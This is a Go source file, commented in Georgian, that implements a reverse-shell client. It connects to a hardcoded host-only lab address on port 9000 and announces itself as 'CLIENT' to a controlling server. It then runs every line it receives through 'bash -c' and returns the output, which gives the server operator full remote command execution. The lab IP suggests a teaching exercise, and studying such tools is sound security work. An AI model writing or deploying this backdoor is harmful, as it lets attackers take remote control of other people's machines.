package main

// ვამატებთ საჭირო პაკეტებს
import (
	"bufio"   // ტექსტის ხაზ-ხაზად წასაკითხად (ReadString)
	"net"     // TCP კავშირებისთვის (Dial)
	"os/exec" // ოპერაციული სისტემის ბრძანებების გასაშვებად
	"strings" // string-ების დამუშავებისთვის (TrimSpace)
)

func main() {
	// SERVER-ის IP და პორტი, რომელსაც client უნდა დაუკავშირდეს
	serverAddr := "192.168.56.101:9000" // Host-only IP + port

	// TCP კავშირის დამყარება server-თან
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		// თუ კავშირი ვერ დამყარდა, პროგრამა უბრალოდ სრულდება
		return
	}

	// SERVER-ს ვატყობინებთ, რომ ეს კავშირი CLIENT-ია
	// server ამას იყენებს ADMIN-ისგან გასარჩევად
	conn.Write([]byte("CLIENT\n"))

	// Reader TCP კავშირიდან შემოსული მონაცემებისთვის
	reader := bufio.NewReader(conn)

	// უსასრულო ციკლი — client მუდმივად ელოდება ბრძანებებს
	for {
		// ვკითხულობთ ერთ ხაზს server-დან (ბრძანება)
		cmdStr, err := reader.ReadString('\n')
		if err != nil {
			// თუ კავშირი გაწყდა (მაგ. server გაითიშა)
			// client სრულდება
			return
		}

		// ზედმეტი whitespace / newline-ების მოცილება
		cmdStr = strings.TrimSpace(cmdStr)

		// თუ ცარიელი სტრიქონია — ვტოვებთ და თავიდან ველოდებით
		if cmdStr == "" {
			continue
		}

		// OS ბრძანების შექმნა:
		// "bash -c <cmdStr>" ნიშნავს, რომ cmdStr შესრულდება shell-ის მეშვეობით
		cmd := exec.Command("bash", "-c", cmdStr)

		// ბრძანების შესრულება და stdout+stderr-ის ერთად აღება
		output, err := cmd.CombinedOutput()

		if err != nil {
			// თუ ბრძანება შეცდომით დასრულდა,
			// შეცდომის ტექსტს ვუგზავნით server-ს
			conn.Write([]byte(err.Error() + "\n"))
			continue
		}

		// თუ ყველაფერი კარგად შესრულდა,
		// ბრძანების შედეგს ვუგზავნით server-ს
		conn.Write(output)

		// newline ვამატებთ, რომ server/admin-მა იცოდეს პასუხის დასასრული
		conn.Write([]byte("\n"))
	}
}
